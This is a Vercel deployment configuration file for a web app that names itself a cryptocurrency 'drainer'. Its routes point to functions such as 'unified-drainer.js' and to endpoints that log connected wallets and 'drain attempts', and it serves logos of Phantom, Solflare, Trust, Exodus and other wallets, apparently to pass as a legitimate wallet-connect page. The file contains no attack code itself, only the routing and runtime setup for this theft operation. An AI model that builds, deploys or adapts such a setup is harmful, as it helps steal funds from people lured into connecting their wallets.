{
  "version": 2,
  "public": true,
  "functions": {
    "api/index.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/wallet-management.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/unified-drainer.js": {
      "maxDuration": 300,
      "memory": 2048
    },
    "api/health.js": {
      "maxDuration": 10,
      "memory": 512
    }
  },
  "routes": [
    {
      "src": "/api/drainer/log-wallet",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-confirmation", 
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-cancellation",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-drain-attempt",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/wallet-management",
      "dest": "/api/wallet-management.js"
    },
    {
      "src": "/api/unified-drainer",
      "dest": "/api/unified-drainer.js"
    },
    {
      "src": "/health",
      "dest": "/api/health.js"
    },
    {
      "src": "/manifest.json",
      "dest": "/public/manifest.json",
      "headers": {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/Hero-section.png",
      "dest": "/public/Hero-section.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/logo.png",
      "dest": "/public/logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/phantom-logo.png",
      "dest": "/public/phantom-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/solflare-logo.png",
      "dest": "/public/solflare-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/backpack-logo.png",
      "dest": "/public/backpack-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/glow-logo.png",
      "dest": "/public/glow-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/trust-logo.png",
      "dest": "/public/trust-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/exodus-logo.png",
      "dest": "/public/exodus-logo.png",
      "headers": {
        "Content-Type": "image/png",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/favicon1.ico",
      "dest": "/public/favicon1.ico",
      "headers": {
        "Content-Type": "image/x-icon",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/(.*\\.(png|jpg|jpeg|gif|ico|svg|css|js|html|json|woff|woff2|ttf|eot))",
      "dest": "/public/$1",
      "headers": {
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/",
      "dest": "/public/index.html"
    },
    {
      "src": "/(.*)",
      "dest": "/public/$1"
    }
  ],
  "env": {
    "NODE_ENV": "production",
    "NODE_OPTIONS": "--max-old-space-size=2048"
  },
  "build": {
    "env": {
      "NODE_ENV": "production"
    }
  }
} 